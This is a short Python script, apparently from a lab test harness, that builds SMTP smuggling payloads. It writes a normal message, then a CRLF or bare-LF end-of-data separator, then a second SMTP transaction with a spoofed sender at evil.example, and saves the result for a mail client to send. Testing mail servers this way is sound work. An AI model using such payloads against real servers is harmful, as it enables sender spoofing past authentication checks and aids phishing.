#!/usr/bin/env python3
"""I1 payload builder. usage: mk_i1_payload.py CASE SEPARATOR(crlf|lf)
Writes /results/i-series/<CASE>.payload  (run inside mail-client)."""
import sys

case, sep = sys.argv[1], sys.argv[2]
sep_bytes = {"crlf": b"\r\n.\r\n", "lf": b"\n.\n"}[sep]

first = (
    "X-Case-ID: " + case + "\r\n"
    "From: alice@sender.lab.test\r\n"
    "To: bob@receiver.lab.test\r\n"
    "Subject: I1 first " + case + "\r\n"
    "\r\n"
    "body of first message\r\n"
).encode()

smug = (
    "MAIL FROM:<eve@evil.example>\r\n"
    "RCPT TO:<bob@receiver.lab.test>\r\n"
    "DATA\r\n"
    "X-Case-ID: SMUG-" + case + "\r\n"
    "From: eve@evil.example\r\n"
    "To: bob@receiver.lab.test\r\n"
    "Subject: I1 SMUGGLED " + case + "\r\n"
    "\r\n"
    "body of smuggled message\r\n.\r\nQUIT\r\n"
).encode()

path = "/results/i-series/" + case + ".payload"
open(path, "wb").write(first + sep_bytes + smug)
print("payload", len(first) + len(sep_bytes) + len(smug), "bytes ->", path)
